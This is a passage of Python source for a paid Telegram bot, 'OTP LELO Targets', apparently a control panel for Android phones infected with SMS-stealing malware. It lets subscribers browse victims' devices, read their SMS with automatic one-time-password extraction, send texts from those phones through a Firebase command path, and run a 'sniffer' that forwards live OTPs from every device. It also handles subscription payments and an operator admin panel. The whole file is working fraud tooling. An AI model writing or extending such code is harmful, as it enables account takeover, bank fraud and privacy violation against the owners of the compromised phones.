        if data.startswith("dup_page_"):
            page = int(data[9:])
            await self.handle_duplicates_menu(update, context, uid, page=page, edit=True)
            return

        if data.startswith("fav_page_"):  
            page = int(data[9:])  
            await self._show_favorites(update, context, uid, page)  
            return  

        if data.startswith("fav_"):  
            key = data[4:]  
            await self._handle_favorite_toggle(update, context, uid, key)  
            return  

        if data.startswith("refresh_sess_"):  
            key = data[13:]  
            session.touch_session()  
            session.is_in_subfunction = False  
            await self._handle_device_select(update, context, uid, key, refresh_only=True)  
            return  

        if data.startswith("accept_order_") or data.startswith("reject_order_"):  
            if uid != self.config.OWNER_ID:  
                return  
            parts = data.split("_")  
            action = parts[0]  
            target_uid = int(parts[2])  
            if action == "accept":  
                duration_seconds = int(parts[3])  
                await self.user_service.add_time(target_uid, duration_seconds)  
                await safe_edit_message(  
                    context,  
                    query.message.chat_id,  
                    query.message.message_id,  
                    f"{escape(query.message.text)}\n\n✅ <b>STATUS: ACCEPTED & VALIDITY CREDITED</b>"  
                )  
                try:  
                    await safe_send_message(  
                        context,  
                        target_uid,  
                        "🎉 <b>Payment Verified & Order Accepted!</b>\n\n"  
                        "✅ Your validity has been successfully added to your account.\n"  
                        "▶️ Click /start to access all monitored devices.",  
                        reply_markup=KeyboardBuilder.get_reply_keyboard(),  
                    )  
                except Exception:  
                    pass  
            elif action == "reject":  
                await safe_edit_message(  
                    context,  
                    query.message.chat_id,  
                    query.message.message_id,  
                    f"{escape(query.message.text)}\n\n❌ <b>STATUS: REJECTED / CANCELLED</b>"  
                )  
                try:  
                    await safe_send_message(  
                        context,  
                        target_uid,  
                        "❌ <b>Order Cancelled / Rejected</b>\n\n"  
                        "If you have already made the payment, please DM @zeeshan4k with your payment proof.",  
                        reply_markup=KeyboardBuilder.get_reply_keyboard(),  
                    )  
                except Exception:  
                    pass  
            return  

        if data == "verify_channel":  
            if await self.channel_service.force_check(context.application, uid):  
                await safe_edit_message(context, query.message.chat_id, query.message.message_id, "✅ Verified! Use /start")  
                await self.cmd_start(update, context)  
            return  
          
        if data == "force_check":  
            if await self.channel_service.force_check(context.application, uid):  
                await self.cmd_start(update, context)  
            return  
          
        if data.startswith("copy_ref_"):  
            ref_link = f"https://t.me/{self.config.BOT_USERNAME}?start=ref_{uid}"  
            await safe_edit_message(  
                context,  
                query.message.chat_id,  
                query.message.message_id,  
                f"🔗 <code>{ref_link}</code>",  
                reply_markup=KeyboardBuilder.referral(uid),  
            )  
            return  
          
        if uid != self.config.OWNER_ID:  
            if not await self.channel_service.is_member(context.application, uid):  
                await safe_edit_message(context, query.message.chat_id, query.message.message_id, "🚫 Join the channel first.", reply_markup=KeyboardBuilder.channel_gate())  
                return  
              
            if not await self.user_service.is_valid(uid):  
                await safe_edit_message(  
                    context,  
                    query.message.chat_id,  
                    query.message.message_id,  
                    "❌ <b>Access Denied</b>\n\n"  
                    "Your validity has expired. Please purchase a subscription plan using <code>/buy</code> to continue using the bot.",  
                )  
                return  
          
        if data.startswith("resume_"):  
            await self._handle_resume(update, context, uid)  
            return  

        if uid != self.config.OWNER_ID:  
            user = await self.firebase.get_user_data(uid)  
            if user and user.get("paused", False):  
                await safe_edit_message(context, query.message.chat_id, query.message.message_id, "⏸️ Timer is FROZEN. Resume to continue.")  
                return  
          
        if data == "noop":  
            return  
        if data == "back_main":  
            await self.sms_service.stop(uid)  
            session.reset_device_state()  
            await self._show_main_menu(update, context, uid, page=session.current_page)  
            return  
        if data.startswith("page_"):  
            page = int(data[5:])  
            session.current_page = page  
            await self._show_main_menu(update, context, uid, page=page)  
            return  
        if data.startswith("pause_"):  
            await self._handle_pause(update, context, uid)  
            return  
        if data.startswith("sel_"):  
            key = data[4:]  
            session.touch_session()
            session.is_in_subfunction = False  
            await self._handle_device_select(update, context, uid, key)  
            return  
        if data.startswith("sms_"):  
            key = data[4:]  
            session.touch_session()
            session.is_in_subfunction = True  
            session.stop_countdown()  
            await self._handle_sms_history(update, context, uid, key)  
            return  
        if data.startswith("cancel_"):  
            await safe_edit_message(context, query.message.chat_id, query.message.message_id, "❌ Cancelled. Use /start")  
            return  

    async def handle_jump_page_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not context.user_data.get("awaiting_jump_page"):  
            return  
        context.user_data.pop("awaiting_jump_page", None)  
        uid = update.effective_user.id  
        session = self.get_session(uid)  
          
        text = update.message.text.strip()  
        if not text.isdigit():  
            await safe_send_message(context, update.effective_chat.id, "❌ Invalid page number.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        target_page = int(text) - 1  
        clients = await self.firebase.get_all_clients(session)  
        online, offline, _ = self._split_devices(clients)  
        total_items = max(len(online), len(offline))  
        total_pages = max(1, (total_items + self.config.DEVICES_PER_PAGE - 1) // self.config.DEVICES_PER_PAGE)  
          
        if target_page < 0 or target_page >= total_pages:  
            await safe_send_message(context, update.effective_chat.id, f"❌ Enter a page between 1 and {total_pages}.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        session.current_page = target_page  
        await self._show_main_menu(update, context, uid, edit=False, page=target_page)  

    async def handle_search_device_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not context.user_data.get("awaiting_search_device"):  
            return  
        context.user_data.pop("awaiting_search_device", None)  
        uid = update.effective_user.id  
        session = self.get_session(uid)  

        query_term = update.message.text.strip().replace("+91", "").replace(" ", "")  
        clients = await self.firebase.get_all_clients(session)  
        
        matched_keys = []  
        for key, info in clients.items():  
            phone = str(info.get("_phone", ""))  
            if query_term in phone:  
                matched_keys.append((key, info))  

        if not matched_keys:  
            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                f"❌ No numbers found matching <code>{escape(query_term)}</code>.",  
                reply_markup=KeyboardBuilder.back_to_main_button(),  
            )  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  
            return  

        if len(matched_keys) == 1:  
            key, _ = matched_keys[0]  
            session.touch_session()
            session.is_in_subfunction = False  
            await self._handle_device_select(update, context, uid, key, edit=False)  
            return  

        keyboard = []  
        for key, info in matched_keys[:10]:  
            phone = info.get("_phone", "Unknown")  
            status = "🟢" if info.get("_is_online") else "🔴"  
            keyboard.append([InlineKeyboardButton(f"{status} {phone}", callback_data=f"sel_{key}")])  
        keyboard.append([InlineKeyboardButton("🔙 Back to Numbers", callback_data="back_main")])  

        msg = await safe_send_message(  
            context,  
            update.effective_chat.id,  
            f"🔍 <b>Search Results for:</b> <code>{escape(query_term)}</code>\nSelect a number below:",  
            reply_markup=InlineKeyboardMarkup(keyboard),  
        )  
        if msg:  
            session.tracked_message_ids.append(msg.message_id)  

    async def _handle_random_number(self, update: Update, context: ContextTypes.DEFAULT_TYPE, uid: int) -> None:  
        session = self.get_session(uid)  
        clients = await self.firebase.get_all_clients(session, force_refresh=False)  
        online_devices = [(k, v) for k, v in clients.items() if v.get("_is_online")]  

        if not online_devices:  
            clients = await self.firebase.get_all_clients(session, force_refresh=True)  
            online_devices = [(k, v) for k, v in clients.items() if v.get("_is_online")]  

        if not online_devices:  
            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                "❌ No online devices available currently. Please try later.",  
                reply_markup=KeyboardBuilder.back_to_main_button()  
            )  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  
            return  

        fresh_candidates = [item for item in online_devices if item[0] not in session.recent_random_keys]
        if not fresh_candidates:
            session.recent_random_keys.clear()
            fresh_candidates = online_devices

        selected_key, _ = random.choice(fresh_candidates)
        session.recent_random_keys.append(selected_key)
        if len(session.recent_random_keys) > 20:
            session.recent_random_keys.pop(0)

        session.touch_session()
        session.is_in_subfunction = False  
        await self._handle_device_select(update, context, uid, selected_key, edit=False)  

    async def handle_duplicates_menu(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
        page: int = 0,  
        edit: bool = False,  
    ) -> None:  
        session = self.get_session(uid)  
        clients = await self.firebase.get_all_clients(session, force_refresh=False)  
        _, _, duplicates = self._split_devices(clients)  

        if not duplicates:  
            msg_text = "✅ <b>No Duplicate Numbers Found!</b>\nAll connected devices have unique phone numbers."  
            if edit and update.callback_query:  
                await safe_edit_message(context, update.callback_query.message.chat_id, update.callback_query.message.message_id, msg_text, reply_markup=KeyboardBuilder.back_to_main_button())  
            else:  
                await safe_send_message(context, update.effective_chat.id, msg_text, reply_markup=KeyboardBuilder.back_to_main_button())  
            return  

        is_owner = (uid == self.config.OWNER_ID)
        total_pages = max(1, (len(duplicates) + self.config.DEVICES_PER_PAGE - 1) // self.config.DEVICES_PER_PAGE)  
        page = min(page, total_pages - 1)  
        keyboard = KeyboardBuilder.duplicates_menu(duplicates, page, total_pages, is_owner=is_owner)  

        text = (  
            f"📑 <b>Duplicate Device Numbers ({len(duplicates)})</b>\n"  
            f"━━━━━━━━━━━━━━━━━━━━━\n"  
            f"These numbers appear on multiple endpoints or client nodes.\n"  
            f"Select any entry below to inspect or monitor:"  
        )  

        if edit and update.callback_query:  
            await safe_edit_message(context, update.callback_query.message.chat_id, update.callback_query.message.message_id, text, reply_markup=keyboard)  
        else:  
            msg = await safe_send_message(context, update.effective_chat.id, text, reply_markup=keyboard)  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  

    # ---- Conversation Handlers ----  
      
    async def conv_send_sms_entry(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> int:  
        try:  
            query = update.callback_query  
            if not query:  
                return ConversationHandler.END  

            await safe_answer_query(query)  

            uid = query.from_user.id  
            session = self.get_session(uid)  
            session.update_activity()  
            session.touch_session()
            session.is_in_subfunction = True  
            session.stop_countdown()  

            key = query.data[5:]  
            info = session.device_full_data.get(key)  

            if not info:  
                await safe_edit_message(context, query.message.chat_id, query.message.message_id, "❌ Device session expired.\nPlease return to /start.")  
                return ConversationHandler.END  

            session.device_key = key  
            context.user_data["sms_conversation_active"] = True  
            context.user_data["device_key"] = key  
            context.user_data.pop("sms_recipient", None)  

            await safe_edit_message(  
                context,  
                query.message.chat_id,  
                query.message.message_id,  
                "📤 <b>Send SMS</b>\n\n"  
                "Enter 10-digit recipient number:\n"  
                "Example: <code>9876543210</code>",  
                reply_markup=KeyboardBuilder.back_to_device_menu(key),  
            )  
            return ConversationState.WAIT_RECIPIENT.value  

        except Exception as e:  
            logger.exception("SMS conversation entry error: %s", e)  
            return ConversationHandler.END  
      
    async def conv_recv_recipient(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> int:  
        try:  
            if not update.message or not update.message.text:  
                return ConversationState.WAIT_RECIPIENT.value  

            uid = update.effective_user.id  
            session = self.get_session(uid)  
            session.update_activity()  
            session.touch_session()

            raw_number = update.message.text.strip()  
            
            if raw_number in MENU_BUTTONS or raw_number.startswith("/"):  
                self._clear_pending_interactive_states(context)  
                await self.handle_text_message(update, context)  
                return ConversationHandler.END  

            cleaned = re.sub(r"[^\d]", "", raw_number)  

            if cleaned.startswith("91") and len(cleaned) == 12:  
                cleaned = cleaned[2:]  

            if len(cleaned) != 10 or not cleaned.isdigit():  
                await safe_send_message(  
                    context,  
                    update.effective_chat.id,  
                    "❌ <b>Invalid number!</b>\nPlease enter a 10-digit mobile number.",  
                    reply_markup=KeyboardBuilder.back_to_device_menu(session.device_key or ""),  
                )  
                return ConversationState.WAIT_RECIPIENT.value  

            device_key = context.user_data.get("device_key", session.device_key)  

            if not device_key or device_key not in session.device_full_data:  
                await safe_send_message(context, update.effective_chat.id, "❌ Device session expired. Use /start.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return ConversationHandler.END  

            context.user_data["sms_recipient"] = cleaned  
            context.user_data["device_key"] = device_key  

            await safe_send_message(  
                context,  
                update.effective_chat.id,  
                f"✅ <b>Recipient:</b> <code>+91{cleaned}</code>\n\nNow enter your message:",  
                reply_markup=KeyboardBuilder.back_to_device_menu(device_key),  
            )  
            return ConversationState.WAIT_MESSAGE.value  

        except Exception as e:  
            logger.exception("Recipient handler error: %s", e)  
            return ConversationState.WAIT_RECIPIENT.value  
      
    async def conv_recv_message(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> int:  
        try:  
            if not update.message or not update.message.text:  
                return ConversationState.WAIT_MESSAGE.value  

            uid = update.effective_user.id  
            session = self.get_session(uid)  
            session.update_activity()  
            session.touch_session()

            message = update.message.text.strip()  

            if message in MENU_BUTTONS or message.startswith("/"):  
                self._clear_pending_interactive_states(context)  
                await self.handle_text_message(update, context)  
                return ConversationHandler.END  

            recipient = context.user_data.pop("sms_recipient", None)  
            device_key = context.user_data.pop("device_key", session.device_key)  
            context.user_data.pop("sms_conversation_active", None)  

            if not recipient or not device_key:  
                await safe_send_message(context, update.effective_chat.id, "❌ Session expired. Use /start.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return ConversationHandler.END  

            info = session.device_full_data.get(device_key)  
            if not info:  
                await safe_send_message(context, update.effective_chat.id, "❌ Device not found. Please use /start.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return ConversationHandler.END  

            url = info.get("_src_url")  
            did = info.get("_original_did")  

            status_msg = await safe_send_message(context, update.effective_chat.id, "📤 <b>Sending SMS...</b>")  

            try:  
                payload = {  
                    "from": 0,  
                    "isSended": False,  
                    "message": message,  
                    "number": recipient,  
                    "phoneNo": recipient,  
                    "simNumber": 1,  
                    "simSlot": 0,  
                    "status": "pending",  
                    "text": message,  
                    "timestamp": int(time.time() * 1000),  
                    "to": recipient,  
                }  

                success = await self.firebase.patch_data(  
                    url,  
                    f"clients/{did}/webhookEvent",  
                    {"sendSms": payload},  
                )  
            finally:  
                if status_msg:  
                    await safe_delete_message(context, status_msg.chat_id, status_msg.message_id)  

            if success:  
                result_text = (  
                    "✅ <b>SMS Sent Successfully!</b>\n"  
                    f"├ To: <code>+91{escape(recipient)}</code>\n"  
                    f"└ Message: {escape(message[:100])}"  
                    f"{'...' if len(message) > 100 else ''}"  
                )  
            else:  
                result_text = "❌ <b>Failed to Send SMS</b>\nPlease try again later."  

            await safe_send_message(context, update.effective_chat.id, result_text, reply_markup=KeyboardBuilder.get_reply_keyboard())  

            session.is_in_subfunction = False  
            favorites = await self.firebase.get_user_favorites(uid)  
            is_favorite = device_key in favorites  

            phone = info.get("_phone", did[:8])  
            battery = info.get("battery", "N/A")  
            status_icon = "🟢" if info.get("_is_online") else "🔴"  
            rem_time = session.get_remaining_session_seconds()  

            sent_card = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                "📱 <b>Device Info</b>\n"  
                f"├ Number: <code>{escape(phone)}</code>\n"  
                f"├ Battery: <code>{escape(battery)}</code>\n"  
                f"├ Status: {status_icon}\n"  
                f"└ ⏳ Session: <code>{rem_time} sec left</code>",  
                reply_markup=KeyboardBuilder.device_menu(device_key, is_favorite),  
            )  
            if sent_card:  
                session.device_card_msg_id = sent_card.message_id  
                session.device_card_chat_id = update.effective_chat.id  
                session.stop_countdown()  
                session.countdown_task = asyncio.create_task(  
                    self._run_device_countdown(context, update.effective_chat.id, sent_card.message_id, uid, device_key)  
                )  

            return ConversationHandler.END  

        except Exception as e:  
            logger.exception("SMS message handler error: %s", e)  
            return ConversationHandler.END  

    async def conv_back_to_device(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> int:  
        self._clear_pending_interactive_states(context)  
        query = update.callback_query  
        if query:  
            await safe_answer_query(query)  
            uid = query.from_user.id  
            key = query.data[4:]  
            session = self.get_session(uid)  
            session.touch_session()  
            session.is_in_subfunction = False  
            await self._handle_device_select(update, context, uid, key, edit=True)  
        return ConversationHandler.END  
      
    async def conv_cancel(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> int:  
        self._clear_pending_interactive_states(context)  
        query = update.callback_query  
        if query:  
            await safe_answer_query(query)  
            await safe_edit_message(context, query.message.chat_id, query.message.message_id, "❌ Cancelled. Use /start")  
        else:  
            await safe_send_message(context, update.effective_chat.id, "❌ Cancelled. Use /start", reply_markup=KeyboardBuilder.get_reply_keyboard())  
        return ConversationHandler.END  
      
    async def conv_timeout(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> int:  
        self._clear_pending_interactive_states(context)  
        if update and update.effective_message:  
            await safe_send_message(context, update.effective_chat.id, "⌛ SMS session timed out. Use /start to return.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
        return ConversationHandler.END  
      
    # ---- Private Helpers ----  
      
    def _is_owner(self, update: Update) -> bool:  
        is_owner = update.effective_user.id == self.config.OWNER_ID  
        if not is_owner:  
            asyncio.create_task(update.message.reply_text("🚫 Unauthorized.", reply_markup=KeyboardBuilder.get_reply_keyboard()))  
        return is_owner  
      
    async def _show_main_menu(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
        edit: bool = True,  
        page: int = 0,  
    ) -> None:  
        try:  
            user = update.effective_user  
            name = f"{user.first_name or ''} {user.last_name or ''}".strip()  
            session = self.get_session(uid)  
            session.update_activity()  
              
            validity = await self.user_service.get_validity_text(uid)  
            pause_info = await self.user_service.get_pause_info(uid)  
            is_paused = pause_info["is_paused"] if pause_info else False  
            remaining_pauses = pause_info["remaining_today"] if pause_info else 0  
              
            if is_paused:  
                online, offline, duplicates = [], [], []  
                message = (  
                    f"🔥 <b>OTP LELO Targets</b>\n━━━━━━━━━━━━━━━\n"  
                    f"👤 <b>{escape(name)}</b>\n{escape(validity)}\n"  
                    f"⏸️ Pauses: {remaining_pauses} left\n\n"  
                    f"⏸️ <b>Timer FROZEN. Resume to access devices.</b>"  
                )  
            else:  
                clients = await self.firebase.get_all_clients(session, force_refresh=False)  
                online, offline, duplicates = self._split_devices(clients)  
                message = (  
                    f"🔥 <b>OTP LELO Targets</b>\n━━━━━━━━━━━━━━━\n"  
                    f"👤 <b>{escape(name)}</b>\n{escape(validity)}\n"  
                    f"▶️ Pauses: {remaining_pauses} left"  
                )  
              
            total_items = max(len(online), len(offline))  
            total_pages = max(  
                1,  
                (total_items + self.config.DEVICES_PER_PAGE - 1)  
                // self.config.DEVICES_PER_PAGE,  
            )  
            page = min(page, total_pages - 1)  
            session.current_page = page  
              
            keyboard = KeyboardBuilder.main_menu(  
                uid, is_paused, remaining_pauses,  
                online, offline, page, total_pages,  
                duplicate_count=len(duplicates)  
            )  

            if edit and update.callback_query:  
                success = await safe_edit_message(  
                    context,  
                    update.callback_query.message.chat_id,  
                    update.callback_query.message.message_id,  
                    message,  
                    reply_markup=keyboard,  
                )  
                if not success:  
                    sent = await safe_send_message(context, update.effective_chat.id, message, reply_markup=keyboard)  
                    if sent:  
                        session.tracked_message_ids.append(sent.message_id)  
            else:  
                sent = await safe_send_message(context, update.effective_chat.id, message, reply_markup=keyboard)  
                if sent:  
                    session.tracked_message_ids.append(sent.message_id)  
        except Exception as e:  
            logger.exception("Show main menu error: %s", e)  
      
    async def _handle_pause(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
    ) -> None:  
        success, msg = await self.user_service.pause(uid)  
        await safe_send_message(context, update.effective_chat.id, msg, reply_markup=KeyboardBuilder.get_reply_keyboard())  
        if success:  
            await self.sms_service.stop(uid)  
            session = self.get_session(uid)  
            session.current_page = 0  
            session.reset_device_state()  
            session.update_activity()  
            await self._show_main_menu(update, context, uid, edit=True)  
      
    async def _handle_resume(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
    ) -> None:  
        success, msg = await self.user_service.resume(uid)  
        await safe_send_message(context, update.effective_chat.id, msg, reply_markup=KeyboardBuilder.get_reply_keyboard())  
        if success:  
            await self.sms_service.stop(uid)  
        session = self.get_session(uid)  
        session.current_page = 0  
        session.reset_device_state()  
        session.update_activity()  
        await self._show_main_menu(update, context, uid, edit=True)  
      
    async def _handle_device_select(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
        key: str,  
        edit: bool = True,  
        refresh_only: bool = False,  
    ) -> None:  
        session = self.get_session(uid)  
        session.update_activity()  
        session.is_in_subfunction = False  
        info = session.device_full_data.get(key)  
        if not info:  
            clients = await self.firebase.get_all_clients(session)  
            info = clients.get(key)  

        if not info:  
            if update.callback_query:  
                await safe_edit_message(  
                    context,  
                    update.callback_query.message.chat_id,  
                    update.callback_query.message.message_id,  
                    "❌ Device not found.",  
                    reply_markup=KeyboardBuilder.back_to_main_button(),  
                )  
            else:  
                msg = await safe_send_message(  
                    context,  
                    update.effective_chat.id,  
                    "❌ Device not found.",  
                    reply_markup=KeyboardBuilder.back_to_main_button(),  
                )  
                if msg:  
                    session.tracked_message_ids.append(msg.message_id)  
            return  
          
        if not refresh_only:  
            await self.sms_service.start(context, uid, session, key)  
        
        phone = info.get("_phone", "Unknown")  
        battery = info.get("battery", "N/A")  
        status = "🟢 Online" if info.get("_is_online") else "🔴 Offline"  

        favorites = await self.firebase.get_user_favorites(uid)  
        is_favorite = key in favorites  
        rem_time = session.get_remaining_session_seconds()  
          
        text = (  
            f"📱 <b>Device Info</b>\n"  
            f"├ Number: <code>{escape(phone)}</code>\n"  
            f"├ Battery: <code>{escape(battery)}</code>\n"  
            f"├ Status: {status}\n"  
            f"└ ⏳ Session: <code>{rem_time} sec left</code>"  
        )  

        chat_id = update.effective_chat.id  
        msg_id = None  

        if edit and update.callback_query:  
            success = await safe_edit_message(  
                context,  
                update.callback_query.message.chat_id,  
                update.callback_query.message.message_id,  
                text,  
                reply_markup=KeyboardBuilder.device_menu(key, is_favorite),  
            )  
            if success:  
                msg_id = update.callback_query.message.message_id  
            else:  
                sent = await safe_send_message(context, update.effective_chat.id, text, reply_markup=KeyboardBuilder.device_menu(key, is_favorite))  
                if sent:  
                    msg_id = sent.message_id  
                    session.tracked_message_ids.append(sent.message_id)  
        else:  
            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                text,  
                reply_markup=KeyboardBuilder.device_menu(key, is_favorite),  
            )  
            if msg:  
                msg_id = msg.message_id  
                session.tracked_message_ids.append(msg.message_id)  

        session.stop_countdown()  
        if msg_id:  
            session.device_card_msg_id = msg_id  
            session.device_card_chat_id = chat_id  
            session.countdown_task = asyncio.create_task(  
                self._run_device_countdown(context, chat_id, msg_id, uid, key)  
            )  
      
    async def _handle_sms_history(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
        uid: int,  
        key: str,  
    ) -> None:  
        query = update.callback_query  
        session = self.get_session(uid)  
        session.update_activity()  
        session.is_in_subfunction = True  
        session.stop_countdown()  
        
        info = session.device_full_data.get(key)  
        if not info:  
            await safe_edit_message(  
                context,  
                query.message.chat_id,  
                query.message.message_id,  
                "❌ Device session expired.",  
                reply_markup=KeyboardBuilder.back_to_main_button(),  
            )  
            return  
          
        url = info.get("_src_url")  
        did = info.get("_original_did")  
        msgs, _ = await self.firebase.http.get(url, f"messages/{did}", query_params='orderBy="$key"&limitToLast=10')
          
        if not isinstance(msgs, dict) or not msgs:  
            await safe_edit_message(  
                context,  
                query.message.chat_id,  
                query.message.message_id,  
                "📭 No SMS history found for this device.",  
                reply_markup=KeyboardBuilder.sms_history_menu(key),  
            )  
            return  
          
        phone = info.get("_phone", did[:8])  
        items = sorted(  
            (m for m in msgs.values() if isinstance(m, dict)),  
            key=lambda x: int(re.sub(r"[^\d]", "", str(x.get("id", 0)))) if re.sub(r"[^\d]", "", str(x.get("id", 0))) else 0,  
            reverse=True,  
        )[:10]  
          
        if not items:  
            await safe_edit_message(  
                context,  
                query.message.chat_id,  
                query.message.message_id,  
                "📭 No SMS history found.",  
                reply_markup=KeyboardBuilder.sms_history_menu(key),  
            )  
            return  
          
        lines = [f"📋 <b>SMS History — {escape(phone)}</b>", ""]  
        for sms in items:  
            direction = "📥" if sms.get("type", "incoming") == "incoming" else "📤"  
            sender = escape(str(sms.get("sender") or sms.get("from") or "Unknown"))  
            raw_date = escape(str(sms.get("dateTime") or sms.get("time") or "").replace('\\', '/'))  
            raw_msg = str(sms.get("message") or sms.get("text") or "(empty)")  
              
            otp = OTPExtractor.extract(raw_msg)  
            safe_content = escape(raw_msg)  
            msg_content = f"{safe_content}\n\n🔑 <code>{escape(otp)}</code>" if otp else safe_content  
              
            lines.append(f"{direction} <code>{raw_date}</code> | {sender}")  
            lines.append(msg_content)  
            lines.append("")  
          
        text = "\n".join(lines)  
        await safe_edit_message(  
            context,  
            query.message.chat_id,  
            query.message.message_id,  
            text[:3900],  
            reply_markup=KeyboardBuilder.sms_history_menu(key),  
        )  

    # ==================== FEATURE: ULTIMATE SNIFFER ====================  
    
    async def handle_sniffer(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        self._clear_pending_interactive_states(context)  
        uid = update.effective_user.id  
        session = self.get_session(uid)  
        session.update_activity()  
        
        if uid != self.config.OWNER_ID:  
            if not await self.channel_service.is_member(context.application, uid):  
                await safe_send_message(context, update.effective_chat.id, "🚫 Please join the channel first.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return  
            if not await self.user_service.is_valid(uid):  
                await safe_send_message(context, update.effective_chat.id, "❌ Your subscription/trial has expired! Use /buy to renew.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return  
        
        is_on = self.sms_service.toggle_sniffer(context, uid)  
        if is_on:  
            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                "🔍 <b>Ultimate Sniffer ON</b>\n\n"  
                "Now actively monitoring ALL devices for incoming SMS in real-time!\n"  
                "Live OTPs will be delivered here instantly as they arrive.\n\n"  
                "Tap again anytime to turn OFF.",  
                reply_markup=KeyboardBuilder.get_reply_keyboard()  
            )  
        else:  
            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                "🔍 <b>Ultimate Sniffer OFF</b>\n\n"  
                "Live SMS sniffing has been disabled.",  
                reply_markup=KeyboardBuilder.get_reply_keyboard()  
            )  
        if msg:  
            session.tracked_message_ids.append(msg.message_id)  

    # ==================== FEATURE: FAVORITES ====================  
    
    async def handle_favorites(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        self._clear_pending_interactive_states(context)  
        uid = update.effective_user.id  
        session = self.get_session(uid)  
        session.update_activity()  
        
        if uid != self.config.OWNER_ID:  
            if not await self.channel_service.is_member(context.application, uid):  
                await safe_send_message(context, update.effective_chat.id, "🚫 Please join the channel first.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return  
            if not await self.user_service.is_valid(uid):  
                await safe_send_message(context, update.effective_chat.id, "❌ Your subscription/trial has expired! Use /buy to renew.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return  
        
        await self._show_favorites(update, context, uid, 0)  
    
    async def _show_favorites(self, update: Update, context: ContextTypes.DEFAULT_TYPE, uid: int, page: int = 0) -> None:  
        favorites_keys = await self.firebase.get_user_favorites(uid)  
        session = self.get_session(uid)  
        
        if not favorites_keys:  
            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                "⭐ <b>No Favorites Yet</b>\n\n"  
                "Select a device and tap '⭐ Add Favorite' to save it here.",  
                reply_markup=KeyboardBuilder.get_reply_keyboard()  
            )  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  
            return  
        
        await self.firebase.get_all_clients(session)  
        
        favorites = []  
        for key in favorites_keys:  
            info = session.device_full_data.get(key)  
            if info:  
                favorites.append({  
                    "key": key,  
                    "phone": info.get("_phone", "Unknown"),  
                    "info": info  
                })  
        
        if not favorites:  
            msg = await safe_send_message(  
                context,  
                update.effective_chat.id,  
                "⭐ <b>No Favorites Found</b>\n\n"  
                "Your favorite devices are currently offline or unavailable.",  
                reply_markup=KeyboardBuilder.get_reply_keyboard()  
            )  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  
            return  
        
        total_pages = max(1, (len(favorites) + self.config.DEVICES_PER_PAGE - 1) // self.config.DEVICES_PER_PAGE)  
        page = min(page, total_pages - 1)  
        
        keyboard = KeyboardBuilder.favorites_menu(favorites, page, total_pages)  
        
        msg = await safe_send_message(  
            context,  
            update.effective_chat.id,  
            f"⭐ <b>Your Favorites</b>\n"  
            f"━━━━━━━━━━━━━━━\n"  
            f"📱 {len(favorites)} saved devices",  
            reply_markup=keyboard,  
        )  
        if msg:  
            session.tracked_message_ids.append(msg.message_id)  
    
    async def _handle_favorite_toggle(self, update: Update, context: ContextTypes.DEFAULT_TYPE, uid: int, key: str) -> None:  
        query = update.callback_query  
        is_added, msg = await self.user_service.toggle_favorite(uid, key)  
        await safe_answer_query(query, text=msg, show_alert=True)  
        
        session = self.get_session(uid)  
        info = session.device_full_data.get(key)  
        if info:  
            phone = info.get("_phone", "Unknown")  
            battery = info.get("battery", "N/A")  
            status = "🟢 Online" if info.get("_is_online") else "🔴 Offline"  
            rem_time = session.get_remaining_session_seconds()  
            text = (  
                f"📱 <b>Device Info</b>\n"  
                f"├ Number: <code>{escape(phone)}</code>\n"  
                f"├ Battery: <code>{escape(battery)}</code>\n"  
                f"├ Status: {status}\n"  
                f"└ ⏳ Session: <code>{rem_time} sec left</code>"  
            )  
            await safe_edit_message(  
                context,  
                query.message.chat_id,  
                query.message.message_id,  
                text,  
                reply_markup=KeyboardBuilder.device_menu(key, is_added),  
            )  

# ============================================================================
# ADMIN PANEL — 20+ Powerful Owner Features
# ============================================================================
class AdminPanel:
    """
    Owner-only Admin Control Panel with 20+ management features.
    Accessible via /admin command. Does NOT affect user dashboard in any way.
    """
    REDEEM_FILE = "redeem_codes.json"
    BANNED_FILE = "banned_users.json"
    BOT_SETTINGS_FILE = "bot_settings.json"

    def __init__(
        self,
        config: BotConfig,
        firebase: FirebaseService,
        user_service: UserService,
        handlers: "BotHandlers",
    ):
